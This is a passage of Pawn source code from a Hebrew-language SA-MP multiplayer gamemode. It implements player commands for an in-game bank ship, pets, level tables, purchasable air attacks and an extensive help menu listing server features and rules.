if(PlayerInfo[playerid][BSHIP] < 1) return SendClientMessage(playerid,WHITE,".אין לך כסף בבנק הספינה");
if(!CPS_IsPlayerInCheckpoint(playerid,Pirate)) return SendClientMessage(playerid,WHITE,".אתה חייב להיות בנקודת ציון על מנת להשתמש בפקודה זאת");
format(string, sizeof(string),".%d-הפסקת בהצלחה, קיבלת סכום של כ", PlayerInfo[playerid][BSHIP]-100);
SendClientMessage(playerid, COLOR_ORANGE, string);
BankShipOn[playerid] = 0;
LACY_GiveMoney(playerid, PlayerInfo[playerid][BSHIP]);
PlayerInfo[playerid][BSHIP]=0;
dini_IntSet(GetPlayerFile(playerid),"BSHIP",0);
return 1;
}

if(strcmp(cmd, "/backdolphin", true) == 0)
{
if(PlayerInfo[playerid][Dolp] ==0) return SendClientMessage(playerid,WHITE,"אין לך דולפין בכלל");
if(PlayerInfo[playerid][Pets] ==0) return SendClientMessage(playerid,WHITE,"אין לך חיה בכלל");
if(ThePetsInYou[playerid] ==0) return SendClientMessage(playerid,WHITE,".החיה לא אצלך");
SendClientMessage(playerid, red, "!החזרת את החיה שלך בהצלחה למקום");
DestroyStreamObject(sam22[playerid]);
ThePetsInYou[playerid] =0;
DolpYou[playerid] =0;
return 1;
}






if(strcmp(cmd, "/levels", true) == 0)
{
new Roy_Killer[256];
Roy_Killer= strtok(cmdtext, idx);
if(20 < strlen(Roy_Killer)) return SendClientMessage(playerid,WHITE,".בלתי אפשרי להפיל את השרת שלנו");
if(!strlen(Roy_Killer))
{
SendClientMessage(playerid,COLOR_WHITE,"/levels 1 :הרמות ומספר ההריגות אשר דורשת להגיע אליהם");
SendClientMessage(playerid,COLOR_WHITE,"/levels 2 :בונוסים ספינת הכסף");
SendClientMessage(playerid,COLOR_WHITE,"/levels 3 :מינימום חיים לשיגור");
SendClientMessage(playerid,COLOR_WHITE,"/levels 4 :חיים ומגן המתמלאים אחרי כל הריגה");
SendClientMessage(playerid,COLOR_WHITE,"/levels 5 :מקסימום כסף אשר נשמר בבנק");
return 1;
}

if(strcmp(Roy_Killer,"1",true) == 0)
{

SendClientMessage(playerid,lblue,"~~~ :הרמות ומספר ההריגות אשר דורשת להגיע אליהם ~~~");
SendClientMessage(playerid,COLOR_BROWN,"( Level, Kills ) :דימוי");
SendClientMessage(playerid,COLOR_YELLOW,"1. 150 | 2. 300 | 3. 500 | 4. 700 | 5. 100 | 6. 1300");
SendClientMessage(playerid,COLOR_YELLOW,"7. 1600 | 8. 1700 | 9. 1900 | 10. 2100 | 11. 2500 | 12. 3000");
SendClientMessage(playerid,COLOR_YELLOW,"13. 3600 | 14. 4000 | 15. 4600 | 16. 5100 | 17. 6100 | 18. 7100");
SendClientMessage(playerid,COLOR_YELLOW,"19. 8100 | 20. 9100 | 21. 10000");

return 1;
}

if(strcmp(Roy_Killer,"2",true) == 0)
{

SendClientMessage(playerid,lblue,"~~~ :בונוסים ספינת הכסף ~~~");
SendClientMessage(playerid,COLOR_BROWN,"( Level, Armour , Money ) :דימוי");
SendClientMessage(playerid,COLOR_YELLOW,"(Level: 0 (Armour: 0.0) (Money (5$) :דוגמא");
SendClientMessage(playerid,COLOR_YELLOW,"1. 0.0, 10$ | 2. 0.0, 15$ | 3. 0.0, 20$ | 4. 0.0, 25$ | 5. 0.0, 30$ | 6. 0.0, $35");
SendClientMessage(playerid,COLOR_YELLOW,"7. 0.0, 40$ | 8. 0.0, 45$ | 9. 0.0, 50$ | 10. 5.0, 55$ | 11. 10.0, 60$ | 12. 15.0, $65");
SendClientMessage(playerid,COLOR_YELLOW,"13. 20.0, 70$ | 14. 25.0, 75$ | 15. 30.0, 80$ | 16. 35.0, 85$ | 17. 35.0, 90$ | 18. 40.0, $95");
SendClientMessage(playerid,COLOR_YELLOW,"19. 45.0, 100$ | 20. 50.0, 105$ | 21. 55.0, 110$");

return 1;
}

if(strcmp(Roy_Killer,"3",true) == 0)
{

SendClientMessage(playerid,lblue,"~~~ :מינימום חיים לשיגור ~~~");
SendClientMessage(playerid,COLOR_BROWN,"( Level, Armour ) :דימוי");
SendClientMessage(playerid,COLOR_YELLOW,"0. 75.0 | 2. 70.0  | 3. 65.0 | 4. 55.0 | 5. 50.0 | 6. 45.0");
SendClientMessage(playerid,COLOR_YELLOW,"7. 40.0 | 8. 35.0 | 9. 30.0 | 10. 25.0 | 11. 20.0 | 12. 15.0");
SendClientMessage(playerid,COLOR_YELLOW,"13. 10.0 | 14. 5.0 | 15. 0.0 | 16. 0.0 | 17. 0.0 | 18. 0.0");
SendClientMessage(playerid,COLOR_YELLOW,"19. 0.0 | 20. 0.0 | 21. 0.0");
return 1;
}


if(strcmp(Roy_Killer,"4",true) == 0)
{
SendClientMessage(playerid,lblue,"~~~ :חיים ומגן המתמלאים אחרי כל הריגה ~~~");
SendClientMessage(playerid,COLOR_BROWN,"( Level, Armour , Health) :דימוי");
SendClientMessage(playerid,COLOR_YELLOW,"1. 0.0, 0.0 | 2. 0.0, 0.0 | 3. 0.0, 0.0 | 4. 0.0, 0.0 | 5. 0.0, 0.0 | 6. 0.0, 0.0");
SendClientMessage(playerid,COLOR_YELLOW,"7. 10.0, 0.0 | 8. 5.0, 0.0 | 9. 0.0, 0.0 | 10. 0.0, 0.0 | 11. 30.0, 45.0 | 12. 30.0, 45.0");
SendClientMessage(playerid,COLOR_YELLOW,"13. 30.0, 45.0 | 14. 30.0, 45.0 | 15. 30.0, 45.0");
SendClientMessage(playerid,COLOR_YELLOW,"16. 30.0, 45.0 | 17. 30.0, 45.0 | 18. 30.0, 45.0");
SendClientMessage(playerid,COLOR_YELLOW,"19. 30.0, 45.0 | 20. 30.0, 45.0 | 15. 21.0, 45.0");
return 1;
}

if(strcmp(Roy_Killer,"5",true) == 0)
{

SendClientMessage(playerid,lblue,".~~~ :מקסימום כסף אשר נשמר בבנק ~~~");
SendClientMessage(playerid,COLOR_BROWN,"( Level: 0, Bank money limit: 1,000,000 ) :דימוי");
SendClientMessage(playerid,COLOR_YELLOW,"1. 2,000,000$ | 2. 3,000,000$ | 3. 4,000,000$ | 4. 5,000,000$ | 5. 6,000,000$ | 6. 7,000,000$");
SendClientMessage(playerid,COLOR_YELLOW,"7. 8,000,000$ | 8. 9,000,000$ | 9. 10,000,000$ | 10. 11,000,000$ | 11. 12,000,000$ | 12. 13,000,000$");
SendClientMessage(playerid,COLOR_YELLOW,"13. 14,000,000$ | 14. 15,000,000$ | 15. 16,000,000$");
SendClientMessage(playerid,COLOR_YELLOW,"16. 17,000,000$ | 17. 18,000,000$ | 18. 19,000,000$");
SendClientMessage(playerid,COLOR_YELLOW,"19. 20,000,000$ | 20. 21,000,000$ | 21. 22,000,000$");
return 1;
}

return 1;
}


if(!strcmp(cmd,"/aasave",true))
{

if(PlayerInfo[playerid][Level] < 3) return Messagelevel(playerid,3);
if(InArea(playerid, 404.8684, 35.6969, 2102.7212, 1653.4156)) return SendClientMessage(playerid,WHITE,".לא תוכל לעשות פה התקפה אווירית");
if(InArea(playerid,-1867.1172 ,-2046.8510, 365.2502,189.3918)) return  SendClientMessage(playerid,WHITE,".לא תוכל לעשות פה התקפה אווירית");
if(InArea(playerid,2147.2263,1968.2661,904.0972,816.9983)) return SendClientMessage(playerid,WHITE,".לא תוכל לעשות פה התקפה אווירית");
if(InArea(playerid,-1053.7112,-1515.2965,560.0065,-740.4934)) return SendClientMessage(playerid,WHITE,".לא תוכל לעשות פה התקפה אווירית");
if(InArea(playerid,1985.0746,1858.3486,-1347.2802,-1464.8994)) return SendClientMessage(playerid,WHITE,".לא תוכל לעשות פה התקפה אווירית");
if(GetPlayerMoney(playerid) < 1000) return SendClientMessage(playerid,red,".אין לך מספיק כסף");
GetPlayerPos(playerid,AirAttack[playerid][0],AirAttack[playerid][1],AirAttack[playerid][2]);
GetPlayerFacingAngle(playerid,AirAttack[playerid][3]);
LACY_GiveMoney(playerid,-1000);
return true;
}



if(!strcmp(cmd,"/aa1",true))
{
if(PlayerInfo[playerid][Level] < 3) return Messagelevel(playerid,3);
if(AirAttack[playerid][0] == 0.0 && AirAttack[playerid][1] == 0.0 && AirAttack[playerid][2] == 0.0) return SendClientMessage(playerid,red,".אין לך שום איזור שמור של התקפה אווירית");
if(AirAttackOn[playerid]) return SendClientMessage(playerid,red,".התקיפה אוורית כבר פועלת אצלך");
if(GetPlayerMoney(playerid) < 7000) return SendClientMessage(playerid,red,".אין לך מספיק כסף");
KillTimeraa[playerid] = SetTimerEx("AirAttackStart",1300,1,"i",playerid);
Stateaa[playerid] = 1;
AsLevel[playerid] = 1;
AirAttackOn[playerid] = 1;
SendClientMessage(playerid,COLOR_LIGHTGREEN,"(Air Attack - AA1) - התחל את מתקפת ה");
LACY_GiveMoney(playerid,-7000);
return true;
}

if(!strcmp(cmd,"/aa2",true))
{
if(PlayerInfo[playerid][Level] < 5) return Messagelevel(playerid,5);
if(AirAttack[playerid][0] == 0.0 && AirAttack[playerid][1] == 0.0 && AirAttack[playerid][2] == 0.0) return SendClientMessage(playerid,red,".אין לך שום איזור שמור של התקפה אווירית");
if(AirAttackOn[playerid]) return SendClientMessage(playerid,red,".התקיפה אוורית כבר פועלת אצלך");
if(GetPlayerMoney(playerid) < 12000) return SendClientMessage(playerid,red,".אין לך מספיק כסף");
LACY_GiveMoney(playerid,-12000);

KillTimeraa[playerid] = SetTimerEx("AirAttackStart",1500,1,"i",playerid);
Stateaa[playerid] = 1;
AsLevel[playerid] = 2;
AirAttackOn[playerid] = 1;
SendClientMessage(playerid,COLOR_LIGHTGREEN,"(Air Attack - AA2) - התחל את מתקפת ה");
return true;
}


if(!strcmp(cmd,"/aa3",true))
{
if(PlayerInfo[playerid][Level] < 10) return Messagelevel(playerid,10);
if(AirAttack[playerid][0] == 0.0 && AirAttack[playerid][1] == 0.0 && AirAttack[playerid][2] == 0.0) return SendClientMessage(playerid,red,".אין לך שום איזור שמור של התקפה אווירית");
if(AirAttackOn[playerid]) return SendClientMessage(playerid,red,".התקיפה אוורית כבר פועלת אצלך");
if(GetPlayerMoney(playerid) < 20000) return SendClientMessage(playerid,red,".אין לך מספיק כסף");
LACY_GiveMoney(playerid,-20000);

KillTimeraa[playerid] = SetTimerEx("AirAttackStart",1300,1,"i",playerid);
Stateaa[playerid] = 1;
AsLevel[playerid] = 3;
AirAttackOn[playerid] = 1;
SendClientMessage(playerid,COLOR_LIGHTGREEN,"(Air Attack - AA3) - התחל את מתקפת ה");
return true;
}


if(strcmp(cmd, "/help", true) == 0)
{
new Roy_Killer[256];
Roy_Killer= strtok(cmdtext, idx);
if(20 < strlen(Roy_Killer)) return SendClientMessage(playerid,WHITE,".בלתי אפשרי להפיל את השרת שלנו");
if(!strlen(Roy_Killer))
{

SendClientMessage(playerid,WHITE,"1 - Help  | 2 - Teleports  | 3 - Commands  | 4 - Animals  | 5 - Bank & Cc  | 6 - Weed");
SendClientMessage(playerid,WHITE,"7 - Monster  | 8 - Karting  | 9 - Grenade  | 10 - Vote  | 11 - War Server");
SendClientMessage(playerid,WHITE,"12 - Minigun  | 13 - Rpg  | 14 - Sail  | 15 - Wang  | 16 - Properties");
SendClientMessage(playerid,WHITE,"17 - Buy Vehicles  | 18 - Account  | 19 - Gangs  | 20 - VIP  | 21 - Supportives");
SendClientMessage(playerid,WHITE,"22 - Call  | 23 - System  | 24 - AntiCheat  | 25 - Rules  | 26 - Credits  | 27 - Stunts & Challenges  | 28 - Dm Zone");
SendClientMessage(playerid,WHITE,"29 - Wanted Level  | 30 - PM  | 31 - Ammunition  | 32 - Racing  | 33 - Drift  | 34 - Triatlon");
SendClientMessage(playerid,WHITE,"35 - Soon  | 36 - Organization  | 37 - Gemel | 38 - BuyFast  | 39 - AirStrike | 40 - Private Drift | 41 - Trivia | 42 - Challenge Hill");
SendClientMessage(playerid,WHITE,"43 - Air Break | 44 - BSHIP | 45 - Hq Owner | 46 - Hasbon | 47 - Jump Kill | 48 - Clan system");
SendClientMessage(playerid,WHITE,"49 - City Race | 50 - Races | 51 - Hitman | 52 - Special Commands | 53 - Air Attack | 54 - Gambling");
SendClientMessage(playerid,WHITE,"55 - Bulletin Board | 56 - Counter Strike | 57 - JetPack War | 58 - SAmmunation | 59 - Lotto | 60 - Petards");


return 1;
}
if(strcmp(Roy_Killer,"1",true) == 0 || strcmp(Roy_Killer,"help",true) == 0)
{
SendClientMessage(playerid, lblue, "~~~ (1 - help) Mode - מוד ~~~");
SendClientMessage(playerid, COLOR_PINK,"/teleports :כדאי לראות שיגורים בשרת");
SendClientMessage(playerid, COLOR_PINK,"/commands :לפקודות");
SendClientMessage(playerid, COLOR_PINK,"/helpme :בקשת עזרה מהתומכים || /help server  - :על מנת לראות תומכים מחוברים");
SendClientMessage(playerid, COLOR_PINK,"/clan :לפקודות מערכת הקלאים");
SendClientMessage(playerid, COLOR_PINK,"/gang :לפקודות מערכת הגאגים");
SendClientMessage(playerid, COLOR_PINK,"/levels :מערכת הרמות");
SendClientMessage(playerid, COLOR_PINK,"/help 2-48 כל העזרה נמצאת בשאר העמודים של העזרה, מומלץ לקרוא");
return true;
}


else if(strcmp(Roy_Killer,"clan",true) == 0)
{
SendClientMessage(playerid, lblue, "~~~ (48 - Clans) Mode - מוד ~~~");
SendClientMessage(playerid, COLOR_PINK, ".כל כנופיה יכולה להפוך לקלאן, וכל קלאן לקלאן רשמי");
SendClientMessage(playerid, COLOR_PINK, ".קלאנים רישמיים מקבלים מפקדה");
SendClientMessage(playerid, COLOR_PINK, ".כל מפקדה כוללת תוספות למשחק, מכוניות ופיקאפים");
SendClientMessage(playerid, COLOR_PURPLE, ":פקודות קלאנים");
SendClientMessage(playerid, COLOR_YELLOW, "/clan(1) /hq(1) /ogate(1) /cgate(1) /clans(1)");
SendClientMessage(playerid,COLOR_YELLOW,"/cdeposit(1) /cdepositall(1) /cwithdrawall(1) /cwithdraw(1) /cbalance(3)");
return true;
}


else if(strcmp(Roy_Killer,"server",true) == 0)
{
if(IsPlayerConnected(playerid))
{
SendClientMessage(playerid, COLOR_WHITE, ".-:בקשה עזרה מהתומכים - \" /helpme \" רשימת תומכים מחוברים --");
for(new i = 0; i < MAX_PLAYERS; i++)
{
if(IsPlayerConnected(i))
{
if(PlayerInfo[i][Supportives] >=1)
{

format(string, 256, " %s  [%d] ", GetName(i), i);
SendClientMessage(playerid, COLOR_YELLOW, string);
}
}
}
}
return true;
}

else if(strcmp(Roy_Killer,"system",true) == 0)
{
SendClientMessage(playerid,red,".-- מערכת השרת --");
SendClientMessage(playerid,COLOR_YELLOW,"/Register - ליצור משתמש חדש");
SendClientMessage(playerid,COLOR_YELLOW,"/login - לבצע התחברות לחשבון");
SendClientMessage(playerid,COLOR_YELLOW,"/changepass - לבצע שינוי סיסמא");
SendClientMessage(playerid,COLOR_YELLOW,"/ChangeNick - כדאי לשנות כידנוי");
SendClientMessage(playerid,COLOR_YELLOW,"/Setting :מגוון שינויים במערכת המשחק");
return true;
}

else if(strcmp(Roy_Killer,"Profile",true) == 0)
{
SendClientMessage(playerid, red,"Usage: /editprofile [function]");
SendClientMessage(playerid, red,"/editprofile open :לפתיחת פרופיל");
SendClientMessage(playerid, red,"/editprofile icq [Number icq] לערוך את המספר אייסקיו");
SendClientMessage(playerid, red,"/editprofile msn [your msn] המסנג'ר שלך");
SendClientMessage(playerid, red,"/editprofile email [Email] לערוך את האימייל שלך");
SendClientMessage(playerid, red,"/editprofile age :לערוך את הגיל שלך");
SendClientMessage(playerid, red,"/editprofile sex [כדאי לערוך את המין שלך [זכר/נקבה ");
SendClientMessage(playerid, red,"/editprofile m [המילה English Only] מילה שאתה מתחבר אליה אנגלית בלבד");
SendClientMessage(playerid, red,"/pProfile [id/name] לראות פרופיל של שחקן אחר - /Profile לראות את הפרופיל שלך");
return true;
}

//---




else if(strcmp(Roy_Killer,"credits",true) == 0)
{
SendClientMessage(playerid, lblue, "~~~ Credits - יוצרי המוד ~~~");
SendClientMessage(playerid, COLOR_LIGHTGREEN, "Satla-Zone.co.il :אתר הקהילה");
SendClientMessage(playerid, COLOR_ORANGE, "JoeShk :תכנות");
SendClientMessage(playerid, COLOR_ORANGE, "BigBite :מתכנת משני");
SendClientMessage(playerid, COLOR_ORANGE, "MidoStream(MidoBan), YSF(Y_LESS)");
format(str, sizeof(str),"!על הצפיה ביוצרי המוד %s - תודה מיוחדת ל",GetName(playerid));
SendClientMessage(playerid, COLOR_ORANGE, str);
return true;
}


else if(strcmp(Roy_Killer,"rules",true) == 0)
{
SendClientMessage(playerid, lblue,".~~~ :Rules - חוקים ~~~");
SendClientMessage(playerid, COLOR_YELLOW," (1) :אנא דבר בכבוד לאדמינים ולחברי השרת");
SendClientMessage(playerid, COLOR_YELLOW, "(2) :אין להציף תצ'אט בהודעות סתמיות");
SendClientMessage(playerid, COLOR_YELLOW, "(3) :צי'טים יגררו לבאן ישירות");
SendClientMessage(playerid, COLOR_YELLOW, "(4) :אין להרוג בשדה התעופה / רייס עם מסוק / הידרה");
SendClientMessage(playerid, COLOR_YELLOW, "(5) :אין לפרסם כתובת מגורים / מספרי פלאפון");
SendClientMessage(playerid, COLOR_YELLOW, "(6) :אין לעשות הרג חברי על מנת ליצר לכם סטאטס גבוה יותר");
SendClientMessage(playerid, COLOR_YELLOW, "(7) :אין להרוג אדמין לבן - אדמין בתפקיד");
SendClientMessage(playerid, COLOR_YELLOW, "(8) - /report :אנא אל תדווחו בשרת על צי'טירים בצ'אט אנא דווחו בפקודה");

return true;
}

else if(strcmp(Roy_Killer,"2",true) == 0 || strcmp(Roy_Killer,"teleports",true) == 0)
{

SendClientMessage(playerid, lblue, "~~~ (2 - Telepots) Mode - מוד ~~~");
SendClientMessage(playerid, COLOR_PINK,".עזרה שיגורים שבוא ניתן לזוז ממקום למקום בעזרת פקודה ולהגיע למקומות הריגה במהירות רבה יותר");
SendClientMessage(playerid, COLOR_PURPLE,":פקודות שיגורים");
SendClientMessage(playerid, COLOR_YELLOW,"/sf(1) /lv(1) /ls(1) /ap(1) /race(1) /ramp(1)");
SendClientMessage(playerid, COLOR_YELLOW,"/dj(1) /sandkings(1) /jump(1) /army(1) /carpark(1) /cycletrip(1)");
SendClientMessage(playerid, COLOR_YELLOW,"/arena(1) /skydive(1) /drifts(1) /garage(1)");
SendClientMessage(playerid, COLOR_YELLOW,"/infernus(1) /bustrip(1) /biketrip(1) /fight(1) /alp(1) /snipe(1)");
SendClientMessage(playerid, COLOR_YELLOW,"/pepe(1) /kickstart(1) /lc(1) /bank(1) /parkour(4) /ammu(1)");
SendClientMessage(playerid, COLOR_YELLOW,"/water(3) /diving(3) /dm /bazooka(10)");
SendClientMessage(playerid, COLOR_YELLOW,"/wdm(1) /hdm(1) /dm(1) /ship(1) /shipmoney(3) /ships(1) /ctest(1)");
return true;
}
else if(strcmp(Roy_Killer,"3",true) == 0 || strcmp(Roy_Killer,"commands",true) == 0)
{
SendClientMessage(playerid, lblue, "~~~ (2 - Commands) Mode - מוד ~~~");
SendClientMessage(playerid, COLOR_PINK,".במוד הזה מותקנת מגוון פקודות בוא נראה את חלק הקטן מהפקודות");
SendClientMessage(playerid, COLOR_PURPLE,":חלק מפקודות המוד");
SendClientMessage(playerid, COLOR_YELLOW,"/players(1) /showid(1) /bigbang(4) /nextlevel(1)");
SendClientMessage(playerid, COLOR_YELLOW,"/sp(2) /lp(1) /profile(1) /pprofile(1) /stats(1) /pstats(1)");
SendClientMessage(playerid, COLOR_YELLOW,"/details(1) /pdetails(1) /pay(1)");
SendClientMessage(playerid, COLOR_YELLOW,"/kill(1) /boome(1) /td(1) /changenick(1) /changepass(1) /saveskin(1) /delskin(1)");
SendClientMessage(playerid, COLOR_YELLOW,"/ignore(1) /unignore(1) /id(/s)(1) /showlevel(1)");
SendClientMessage(playerid, COLOR_YELLOW,"/afk(1) /unafk(1) /me(2)");
return true;
}
else if(strcmp(Roy_Killer,"4",true) == 0 || strcmp(Roy_Killer,"Animals",true) == 0)
{
SendClientMessage(playerid, lblue, "~~~ (4 - Pets) Mode - מוד ~~~");
SendClientMessage(playerid, COLOR_PINK,".בעזרה זה מותקנת מערכת חיות איתה בא ניתן לקנות חיות");
SendClientMessage(playerid, COLOR_PINK,".לתקוף אנשים בעזרת החיות");
SendClientMessage(playerid, COLOR_PINK,".בנוסף לכל יש גם סטאטס לחיות שיראה לכם כמה הריגות יש לחיה שלכם");
SendClientMessage(playerid, COLOR_PURPLE,":פקודות מערכת החיות");
SendClientMessage(playerid,COLOR_YELLOW,"/selltor /buytor (3) backtor /calltor (3) /ator [id/name]");
SendClientMessage(playerid,COLOR_YELLOW,"/sellshark  /buyshark (5) /backshark  /callshark (5) /ashark [id/name]");
SendClientMessage(playerid,COLOR_YELLOW,"/selldolphin /buydolphin (3) /backdolphin /calldolphin (4) /adolp [id/name]");
SendClientMessage(playerid,COLOR_YELLOW,"/help pets - /ppet [id/name] /mypet");
return true;
}
else if(strcmp(Roy_Killer,"5",true) == 0 || strcmp(Roy_Killer,"Bank",true) == 0)
{
SendClientMessage(playerid, lblue, "~~~ (5 - Bank) Mode - מוד ~~~");
SendClientMessage(playerid, COLOR_PINK,".בבנק תוכל לשמור כסף , גם אחרי שתמות הכסף ישמר");
SendClientMessage(playerid, COLOR_PINK,".יש גם כרטיס אשראי שבוא תוכל להשתמש מחוץ לבנק למשיכת כספים");
SendClientMessage(playerid, COLOR_PINK,"קניית כרטיס אשראי עולה כ700000 | מכירת כרטיס אשראי תחזיר כ350000");
SendClientMessage(playerid, COLOR_PURPLE,":פקודות בנק");
SendClientMessage(playerid, COLOR_YELLOW,"/deposit(1) /depositall /withdraw(1) /withdrawall(1)");
SendClientMessage(playerid, COLOR_YELLOW,"/balance");
SendClientMessage(playerid, COLOR_YELLOW, "/getloan(4) /backloan (4)");
SendClientMessage(playerid, COLOR_PURPLE,":פקודות כרטיס אשראי");
SendClientMessage(playerid, COLOR_YELLOW,"/buycc(3) /sellcc(3) /withdrawc(3)");
return true;
}
else if(strcmp(Roy_Killer,"6",true) == 0 || strcmp(Roy_Killer,"weed",true) == 0)
{
SendClientMessage(playerid, lblue, "~~~ (6 - Weed) Mode - מוד ~~~");
SendClientMessage(playerid, COLOR_PINK,"בעזרה זה מותקנת מערכת סמים חממה שבה ניתן");
SendClientMessage(playerid, COLOR_PINK,".למכור סמים , לחפש סמים , לקנות סמים , להשתמש בסמים");
SendClientMessage(playerid, COLOR_PURPLE,":פקודות סמים");
SendClientMessage(playerid, COLOR_YELLOW,"/useweed(1) /sellweed(1) /buyweed(1) /details(1) /declinedeal(1)");
return true;
}

else if(strcmp(Roy_Killer,"7",true) == 0 || strcmp(Roy_Killer,"Monster",true) == 0)
{
SendClientMessage(playerid, lblue, "~~~ (7 - Monsters) Mode - מוד ~~~");
SendClientMessage(playerid, COLOR_PINK, ".Monster בפעילות האוטומטית הזאת, כל המצטרפים ייתנגשו זה בזה עם רכב מסוג");
SendClientMessage(playerid, COLOR_PINK, ".$מי שנהרסה לו המכונית או יצא מהמכונית יפסל והאחרון שישאר במונסטר יזכה ב - 25000");
SendClientMessage(playerid, COLOR_PURPLE, ":Monster פקודות תחרות ה");
SendClientMessage(playerid, COLOR_YELLOW, "/monster(1)");
return true;
}

else if(strcmp(Roy_Killer,"8",true) == 0|| strcmp(Roy_Killer,"Kart",true) == 0)
{
SendClientMessage(playerid, lblue, "~~~ (8 - Karts) Mode - מוד ~~~");
SendClientMessage(playerid, COLOR_PINK, ".Kart בפעילות האוטומטית הזאת, כל המצטרפים ייתנגשו זה בזה על בניין אחד גבוה עם רכב מסוג");
SendClientMessage(playerid, COLOR_PINK, ".$מי שנופל או מת נפסל, והאחרון שנשאר - מנצח וזוכה ב 40000");
SendClientMessage(playerid, COLOR_PURPLE, ":Kart פקודות תחרות ה");
SendClientMessage(playerid, COLOR_YELLOW, "/joinkart(1)");

return true;
}

else if(strcmp(Roy_Killer,"9",true) == 0 || strcmp(Roy_Killer,"gre",true) == 0)
{
SendClientMessage(playerid, lblue, "~~~ (9 - Grenade) Mode - מוד ~~~");
SendClientMessage(playerid, COLOR_PINK, ".גם מלחמת הרימונים היא דרך להשיג כסף");
SendClientMessage(playerid, COLOR_PINK, ".$כל הלוחמים הטובים, יוכלו לנצח ולהרוויח פרס כספי - 30000");
SendClientMessage(playerid, COLOR_PINK, ".Grenade - כל המצטרפים ייקבלו את הנשק");
SendClientMessage(playerid, COLOR_PURPLE, ":פקודות מלחמת הרימונים");
SendClientMessage(playerid, COLOR_YELLOW, "/gre(1)");
return true;
}

else if(strcmp(Roy_Killer,"10",true) == 0 || strcmp(Roy_Killer,"vote",true) == 0)
{
SendClientMessage(playerid, lblue, "~~~ (10 - Vote) Mode - מוד ~~~");
SendClientMessage(playerid, COLOR_PINK, ".מערכתף הסקרים, מערכת הסקרם הינה מערכת שתעזור לאדמין להחליט על דבר כל שהוא");
SendClientMessage(playerid, COLOR_PINK, ".לדוגמה: איפה פעילות להפעיל, מה לעשות, מה לחבור, ניתן להצביע חיובי, ושלילי");
SendClientMessage(playerid, COLOR_PINK, ".כל אחד יכול להצביע פעם אחת בסקר");
SendClientMessage(playerid, COLOR_PURPLE, ":פקודות מערכת סקרים");
SendClientMessage(playerid, COLOR_YELLOW, "/vote(1)");
return true;
}
else if(strcmp(Roy_Killer,"11",true) == 0 || strcmp(Roy_Killer,"WAR",true) == 0)
{
SendClientMessage(playerid, lblue, "~~~ (11 - Server War) Mode - מוד ~~~");
SendClientMessage(playerid, COLOR_PINK, ".גם מלחמת השרת היא דרך להשיג כסף");
SendClientMessage(playerid, COLOR_PINK, ".$כל הלוחמים הטובים, יוכלו לנצח ולהרוויח פרס כספי - 30000");
SendClientMessage(playerid, COLOR_PINK, ".כל המצטרפים יקבלו נשק ראנדומלי והאחרון שישאר חיי, ינצח");
SendClientMessage(playerid, COLOR_PURPLE, ":פקודות מלחמת שרת");
SendClientMessage(playerid, COLOR_YELLOW, "/war(1)");
return true;
}

else if(strcmp(Roy_Killer,"12",true) == 0 || strcmp(Roy_Killer,"Minigun",true) == 0)
{
SendClientMessage(playerid, lblue, "~~~ (12 - Minigun War) Mode - מוד ~~~");
SendClientMessage(playerid, COLOR_PINK," כאשר איתה אתה נלחם בשחקנים ,Minigun בעזרה זה מותקנת מערכת");
SendClientMessage(playerid, COLOR_PINK,".ואיתו ילחם בשחקנים אחרים Minigun כל שחקן יקבל תנשק");
SendClientMessage(playerid, COLOR_PURPLE,":פקודות מיניגאן");
SendClientMessage(playerid, COLOR_YELLOW,"/mini(1)");
return true;
}

else if(strcmp(Roy_Killer,"13",true) == 0 || strcmp(Roy_Killer,"RPG",true) == 0)
{
SendClientMessage(playerid, lblue, "~~~ (13 - Rpg War) Mode - מוד ~~~");
SendClientMessage(playerid, COLOR_PINK," כאשר איתה אתה נלחם בשחקנים עם בזוקות.Rpg בעזרה זה מותקנת מערכת");
SendClientMessage(playerid, COLOR_PINK,"כל שחקן הרשום לפעילות יקבל בזוקה");
SendClientMessage(playerid, COLOR_PURPLE,":פקודות מלחמת טילים");
SendClientMessage(playerid, COLOR_YELLOW,"/rpg(1)");

return true;
}

else if(strcmp(Roy_Killer,"14",true) == 0 || strcmp(Roy_Killer,"Sail",true) == 0) return SendClientMessage(playerid,red,"ירד מהמוד עקב באגים");
else if(strcmp(Roy_Killer,"15",true) == 0)
{
SendClientMessage(playerid, lblue, "~~~ (15 - Wang) Mode - מוד ~~~");
SendClientMessage(playerid, COLOR_PINK, ".ניתן למכור למוסך וואנג רכב שהוא מבקש ולקבל סכום כסף מסויים תמורתו");
SendClientMessage(playerid, COLOR_PINK, ".מוסך וואנג מפרסם בלוח מודעות את הרכב שהוא מחפש");
SendClientMessage(playerid, COLOR_PURPLE, ":פקודות מוסך וואנג");
SendClientMessage(playerid, COLOR_YELLOW, "/exports(1)");
return true;
}
else if(strcmp(Roy_Killer,"16",true) == 0 || strcmp(Roy_Killer,"prop",true) == 0)
{
SendClientMessage(playerid, lblue, "~~~ (16 - Properties) Mode - מוד ~~~");
SendClientMessage(playerid, COLOR_PINK, ".נכסים הם הדרך הטובה ביותר להרוויח כסף");
SendClientMessage(playerid, COLOR_PINK, ".לאחר שקנית נכס, תקבל כל שתי דקות תקבל ממנו משכורת");
SendClientMessage(playerid, COLOR_PURPLE, ":פקודות הקשורות בנכסים");
SendClientMessage(playerid, COLOR_YELLOW, "/props(1) /buy(1) /sell(2)");
return true;
}

else if(strcmp(Roy_Killer,"17",true) == 0)
{
SendClientMessage(playerid, lblue, "~~~ (17 - Vehicles) Mode - מוד ~~~");
SendClientMessage(playerid, COLOR_PINK, ".ניתן להגיע לחנות המכניות ולקנות רכב שניתן לזמן אותו אליך תמיד");
SendClientMessage(playerid, COLOR_PINK, ".במידה ואתם רשומים, הרכב שקינתם יישמר לתמיד");
SendClientMessage(playerid, COLOR_PURPLE, ":פקודות מכוניות");
SendClientMessage(playerid, COLOR_YELLOW, "/buycar(2) /callcar(2) /sellcar(2) /repair(2) /setprice(2) /stopsale(2)");
SendClientMessage(playerid, COLOR_YELLOW, "/buynitro(2) /sellnitro(2) /lockv(2) /unlockv(2) /eject(2)");
return true;
}
else if(strcmp(Roy_Killer,"18",true) == 0)
{
SendClientMessage(playerid, lblue, "~~~ (18 - Account) Mode - מוד ~~~");
SendClientMessage(playerid, COLOR_PINK, ".חשבונות המשתמשים הם הדבר העיקרי במוד");
SendClientMessage(playerid, COLOR_PINK, ".חשבון המשתמש שלך הוא הדבר שאמור להיות הכי חשוב לך במוד");
SendClientMessage(playerid, COLOR_PINK, ".לאחר שנרשמת עם שם משתמש חדש, ייפתחו בפניך יותר אפשריות משחק ופרטיך ישמרו");
